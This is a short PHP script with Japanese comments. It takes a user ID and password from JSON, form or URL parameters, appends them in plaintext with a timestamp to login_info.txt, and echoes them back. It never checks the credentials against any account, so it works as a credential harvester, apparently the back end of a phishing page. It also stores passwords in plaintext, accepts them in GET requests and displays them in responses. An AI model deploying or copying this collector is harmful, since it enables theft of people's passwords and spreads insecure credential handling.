<?php


function getCredentials(){
    $userid = '';
    $password = '';

    // JSONリクエストの場合
    if ($_SERVER["REQUEST_METHOD"] === "POST" && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false) {
        // JSONデータを受け取る
        $data = json_decode(file_get_contents("php://input"), true);
        if ($data !== null) {
            $userid = htmlspecialchars($data['userid'] ?? '', ENT_QUOTES, 'UTF-8');
            $password = htmlspecialchars($data['password'] ?? '', ENT_QUOTES, 'UTF-8');
        }
    }
    // フォームデータ（application/x-www-form-urlencoded または multipart/form-data）の場合
    elseif ($_SERVER["REQUEST_METHOD"] === "POST") {
        $userid = htmlspecialchars($_POST['userid'] ?? '', ENT_QUOTES, 'UTF-8');
        $password = htmlspecialchars($_POST['password'] ?? '', ENT_QUOTES, 'UTF-8');
    }
    // URLパラメータ（GETリクエスト）の場合
    elseif ($_SERVER["REQUEST_METHOD"] === "GET") {
        $userid = htmlspecialchars($_GET['userid'] ?? '', ENT_QUOTES, 'UTF-8');
        $password = htmlspecialchars($_GET['password'] ?? '', ENT_QUOTES, 'UTF-8');
    }

    return [$userid, $password];
}

// ユーザー名とパスワードを取得
list($userid, $password) = getCredentials();
echo "userid:$userid\n";
// ログイン情報を保存するファイルのパス
$file = 'login_info.txt';

// タイムゾーンを日本時間（JST）に設定
date_default_timezone_set('Asia/Tokyo');
// 現在の日時を取得
$date = date('Y-m-d H:i:s');
// ログイン情報をフォーマット
$log = "日時: $date\nユーザー名: $userid\nパスワード: $password\n\n";

// ファイルに追記
file_put_contents($file, $log, FILE_APPEND);

echo "ログイン情報が保存されました。\n{$log}";


?>
<h1><?php /* echo  "⭐ログイン情報が保存されました。\n{$log}" */?></h1>
